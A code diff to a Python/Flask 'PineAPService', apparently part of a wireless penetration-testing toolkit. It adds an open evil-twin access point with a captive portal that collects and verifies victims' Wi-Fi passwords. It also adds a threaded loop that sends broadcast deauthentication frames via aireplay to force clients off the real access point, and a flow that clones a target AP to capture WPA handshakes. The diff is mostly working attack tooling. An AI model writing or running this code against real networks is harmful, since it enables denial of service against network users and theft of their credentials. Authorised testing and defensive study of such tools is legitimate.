@@ -141,6 +141,10 @@ class PineAPService:
         # Impersonation SSID-rotation thread (S13)
         self._impersonation_thread: threading.Thread | None = None
         self._impersonation_stop = threading.Event()
+        # Standalone broadcast-deauth loop for the *direct* open-portal
+        # path (the WPA2 capture flow has its own deauth in evil_wpa).
+        self._direct_deauth_thread: threading.Thread | None = None
+        self._direct_deauth_stop = threading.Event()
 
     # ---------- Persistence ----------
     def _load(self) -> None:
@@ -247,6 +251,9 @@ class PineAPService:
             "auto_captive_portal": False,
             # Runtime flag — True while the portal is live post-flip.
             "captive_portal_active": False,
+            # Runtime flag — True while the direct open-portal path's
+            # standalone broadcast-deauth loop is running.
+            "direct_deauth_running": False,
             # Whether the rogue dnsmasq is currently in DNS-hijack mode
             # (captive portal). Tracked so the bait-switch knows it doesn't
             # need a mid-flight dnsmasq restart.
@@ -1159,6 +1166,14 @@ class PineAPService:
             except Exception as e:
                 msgs.append(f"captive portal teardown failed: {e}")
 
+        # 0b. Direct open-portal standalone deauth loop (if running).
+        if snap.get("direct_deauth_running"):
+            try:
+                self._stop_direct_deauth()
+                msgs.append("direct deauth loop stopped")
+            except Exception as e:
+                msgs.append(f"direct deauth stop failed: {e}")
+
         # 1. Karma OR Evil WPA (mutually exclusive — both pin wlan-mon-5g).
         #    Evil WPA's stop() also tears down the coupled deauth thread
         #    on the spare radio.
@@ -1262,6 +1277,7 @@ class PineAPService:
         msgs: list[str] = []
         from app.services.captive_portal import get_service as get_cp
         cp = get_cp()
+        self._register_teardown_app(cp)
         if not cp.is_enabled():
             return False, ["captive portal disabled (Settings → Security) "
                            "— bait-switch skipped"]
@@ -1418,27 +1434,75 @@ class PineAPService:
             log.exception("pineap: dnsmasq restart failed")
             return False, [f"dnsmasq restart failed: {e}"]
 
-    # ---------- Direct captive portal (S12.5) — no handshake needed ----------
-    def launch_captive_portal_direct(self, ssid: str | None = None
-                                     ) -> tuple[bool, list[str]]:
-        """Stand up an OPEN evil-twin + captive portal directly, without
-        first capturing a WPA handshake. For clients that won't hand over
-        a handshake (the case the portal is really for). Submitted PSKs
-        are recorded but not verified (no handshake to check against)
-        unless one was already armed.
+    # ---------- Teardown-app registration (post-capture twin teardown) ----------
+    def _register_teardown_app(self, cp: Any) -> None:
+        """Hand the captive-portal service the Flask app object so its
+        post-capture teardown timer can push a context. Best-effort."""
+        try:
+            from flask import current_app
+            cp.set_runtime_app(current_app._get_current_object())
+        except Exception:
+            pass
+
+    # ---------- Direct captive portal (S12.5) ----------
+    def launch_captive_portal_direct(
+        self, ssid: str | None = None, *,
+        deauth: bool = True,
+        handshake_id: str | None = None,
+    ) -> tuple[bool, list[str]]:
+        """Stand up an OPEN evil-twin + captive portal directly.
+
+        Verification of submitted PSKs needs a captured 4-way handshake.
+        Three paths, decided by the verify mode + what's supplied:
+
+        * **mode A** — no handshake needed (always shows "success"); open
+          the portal immediately.
+        * **B/C with a chosen ``handshake_id``** — arm against that
+          previously captured handshake, then open the portal; submitted
+          PSKs are verified against it.
+        * **B/C with no handshake** — we can't verify from an *open* twin
+          (open networks have no EAPOL). So fall back to the WPA2
+          capture-first flow: stand up the WPA2 twin against the real AP
+          (looked up in Recon by SSID), capture a handshake, and the
+          bait-switch flips to the open portal automatically on the first
+          partial. Requires the SSID to be visible in Recon.
+
+        ``deauth`` (default True) fires broadcast deauth at the matching
+        real AP (looked up in Recon) on the spare radio to push clients
+        onto our clone — warned-not-blocked on MFP-required targets.
 
         Gated on the global captive-portal opt-in (Settings → Security).
         """
         from app.services.captive_portal import get_service as get_cp
         cp = get_cp()
+        self._register_teardown_app(cp)
         if not cp.is_enabled():
             return False, ["captive portal disabled (Settings → Security)"]
 
-        msgs: list[str] = []
+        mode = cp.get_config().get("verify_mode", "A")
         with self._lock:
             self._load()
-            running = self._state.get("running")
             target_ssid = (ssid or "").strip() or self._state.get("primary_ssid")
+
+        # Resolve a hash line if the operator picked a previously captured
+        # handshake (used to arm verification on the open-twin path).
+        hash_line: str | None = None
+        if handshake_id:
+            hash_line, hs_ssid, hs_msg = self._resolve_handshake_line(handshake_id)
+            if not hash_line:
+                return False, [f"handshake {handshake_id[:8]}…: {hs_msg}"]
+            if hs_ssid:
+                target_ssid = hs_ssid  # arm + clone the SSID we have a HS for
+
+        # B/C with no handshake → must capture one first (open twins can't
+        # produce a handshake). Delegate to the proven WPA2 capture flow.
+        if mode in ("B", "C") and not hash_line:
+            return self._capture_then_open(target_ssid, deauth=deauth)
+
+        # ---- Open-twin path (mode A, or B/C with a chosen handshake) ----
+        msgs: list[str] = []
+        with self._lock:
+            running = self._state.get("running")
 
         if not running:
             ok, m = self.set_ap_config(primary_ssid=target_ssid,
@@ -1456,8 +1520,6 @@ class PineAPService:
             if not ok:
                 return False, msgs
         else:
-            # Running already — make it an open AP + hijack dnsmasq (the
-            # one case that still needs a restart; dnsmasq was forwarding).
             with self._lock:
                 snap = dict(self._state)
             ok, sub = self._rerender_hostapd_open(snap)
@@ -1471,22 +1533,184 @@ class PineAPService:
             self._load()
             snap = dict(self._state)
 
-        # Arm the portal with no handshake (verification unavailable) and
-        # flip the sentinel to portal mode. dnsmasq is already hijacked.
-        cp.arm(None, target_ssid)
-        msgs.append(f"portal armed for {target_ssid!r} (no handshake — "
-                    "submitted creds recorded, not verified)")
+        # Arm the portal — with the chosen handshake if we have one, else
+        # None (mode A: submitted creds recorded but not verified).
+        cp.arm(hash_line, target_ssid)
+        if hash_line:
+            msgs.append(f"portal armed for {target_ssid!r} against chosen "
+                        "handshake (submitted PSKs verified)")
+        else:
+            msgs.append(f"portal armed for {target_ssid!r} (no handshake — "
+                        "submitted creds recorded, not verified)")
         try:
             from app.services.captive_sentinel import get_service as get_sentinel
             get_sentinel().set_portal_mode(True, portal=cp)
             msgs.append("captive sentinel → portal mode")
         except Exception as e:
             msgs.append(f"sentinel portal-mode failed: {e}")
+
+        # Optional broadcast deauth at the real AP to pull clients over.
+        if deauth:
+            msgs.extend(self._start_direct_deauth(target_ssid))
+
         with self._lock:
             self._state["captive_portal_active"] = True
             self._save_state()
         log.info("pineap: direct captive portal live for %r", target_ssid)
         return True, msgs
+
+    def _capture_then_open(self, target_ssid: str | None, *, deauth: bool
+                           ) -> tuple[bool, list[str]]:
+        """B/C verification with no chosen handshake: stand up the WPA2
+        evil twin against the real AP (found in Recon by SSID) with the
+        bait-switch armed, so it captures a handshake and auto-flips to the
+        open portal. Verification then works against the captured HS."""
+        msgs: list[str] = []
+        with self._lock:
+            if self._state.get("running"):
+                return False, ["stop PineAP first — capture-first needs to "
+                               "(re)start the WPA2 twin"]
+        ap = self._find_recon_ap(target_ssid)
+        if not ap:
+            return False, [
+                f"verify mode needs a handshake, but no Recon AP matches "
+                f"{target_ssid!r}. Run Recon (or clone the target on the "
+                "Evil WPA tab), or pick an existing handshake."]
+        ok, m = self.clone_evil_wpa_target(
+            ap["bssid"], ap["essid"], ap["channel"],
+            source_security=ap.get("security"),
+            source_mfp_required=ap.get("mfp_required"),
+        )
+        msgs.append(f"clone: {m}")
+        if not ok:
+            return False, msgs
+        # Arm the bait-switch + (optional) deauth for this run, then start
+        # the WPA2 twin. evil_wpa fires launch_captive_portal on the first
+        # partial, which arms the portal against the real captured HS.
+        with self._lock:
+            self._state["auto_captive_portal"] = True
+            self._state["evil_wpa_deauth"] = bool(deauth)
+            self._save_state()
+        self.set_mode("active")
+        ok, sub = self.start()
+        msgs.extend(sub)
+        if not ok:
+            return False, msgs
+        msgs.append(f"capturing handshake for {ap['essid']!r} — the open "
+                    "portal opens automatically on the first capture")
+        return True, msgs
+
+    # ---------- Recon lookup + handshake resolution helpers ----------
+    def _find_recon_ap(self, essid: str | None) -> dict[str, Any] | None:
+        """Strongest Recon AP whose ESSID matches ``essid``. Returns a
+        dict with bssid/essid/channel/security/mfp_required, or None."""
+        if not essid:
+            return None
+        try:
+            from app.services.recon import get_service as get_recon
+            return get_recon().find_ap_by_essid(essid)
+        except Exception:
+            log.exception("pineap: recon AP lookup failed")
+            return None
+
+    def _resolve_handshake_line(self, capture_id: str
+                                ) -> tuple[str | None, str | None, str]:
+        """Resolve a captured handshake to its single ``.22000`` line +
+        ESSID, building the file on demand. Returns ``(line, essid, msg)``."""
+        try:
+            from app.services.handshakes import get_service as get_hs
+            return get_hs().get_hash_line(capture_id)
+        except Exception as e:
+            log.exception("pineap: handshake resolve failed")
+            return None, None, f"resolve failed: {e}"
+
+    # ---------- Standalone broadcast deauth (direct open-portal path) ----------
+    def _start_direct_deauth(self, ssid: str | None) -> list[str]:
+        """Spawn a broadcast-deauth loop at the real AP matching ``ssid``
+        (found in Recon) on the spare radio, to push its clients onto our
+        open clone. No-op (warned) on MFP-required targets or when the AP
+        isn't in Recon."""
+        ap = self._find_recon_ap(ssid)
+        if not ap:
+            return [f"deauth requested but no Recon AP matches {ssid!r} — "
+                    "skipping deauth (run Recon to enable it)"]
+        bssid = ap["bssid"]
+        channel = int(ap["channel"])
+        with self._lock:
+            iface = self._state.get("deauth_iface", DEFAULT_DEAUTH_IFACE)
+        self._stop_direct_deauth()
+        self._direct_deauth_stop.clear()
+
+        try:
+            from flask import current_app
+            app = current_app._get_current_object()
+        except Exception:
+            app = None
+
+        def _run() -> None:
+            ctx = app.app_context() if app is not None else None
+            if ctx:
+                ctx.push()
+            try:
+                self._direct_deauth_loop(iface, bssid, channel)
+            except Exception:
+                log.exception("pineap: direct deauth loop crashed")
+            finally:
+                if ctx:
+                    ctx.pop()
+
+        t = threading.Thread(target=_run, name="pineap-direct-deauth",
+                             daemon=True)
+        self._direct_deauth_thread = t
+        t.start()
+        with self._lock:
+            self._state["direct_deauth_running"] = True
+            self._save_state()
+        mfp = " (target advertises MFP-required — frames will be rejected)" \
+            if ap.get("mfp_required") else ""
+        return [f"broadcast deauth armed at {bssid} (ch{channel}) on "
+                f"{iface}{mfp}"]
+
+    def _direct_deauth_loop(self, iface: str, bssid: str, channel: int) -> None:
+        """Prep the spare radio once (monitor + channel) then fire
+        broadcast deauth bursts until stopped."""
+        from app.tools import aireplay, iw
+        from app.tools._common import stub_mode
+        from app.services.adapters import get_service as get_adapter_service
+
+        if not stub_mode():
+            try:
+                get_adapter_service().set_mode(iface, "monitor")
+                iw.set_channel(iface, channel)
+            except Exception:
+                log.exception("pineap: direct deauth iface prep failed")
+        log.info("pineap: direct deauth loop firing at %s ch%d on %s",
+                 bssid, channel, iface)
+        # Brief settle so the radio is on-channel before the first burst.
+        self._direct_deauth_stop.wait(2.0)
+        while not self._direct_deauth_stop.is_set():
+            if not stub_mode():
+                try:
+                    aireplay.send_deauth(iface, bssid, client_mac=None, count=8)
+                except Exception:
+                    log.exception("pineap: direct deauth burst failed")
+            self._direct_deauth_stop.wait(5.0)
+        log.info("pineap: direct deauth loop stopped")
+
+    def _stop_direct_deauth(self) -> None:
+        """Signal the direct-deauth loop to stop (if running)."""
+        self._direct_deauth_stop.set()
+        t = self._direct_deauth_thread
+        if t and t.is_alive():
+            t.join(timeout=2.0)
+        self._direct_deauth_thread = None
+        try:
+            with self._lock:
+                if self._state is not None:
+                    self._state["direct_deauth_running"] = False
+                    self._save_state()
+        except Exception:
+            pass
 
     # ---------- Impersonation SSID rotation (S13) ----------
     def _start_impersonation(self) -> None:
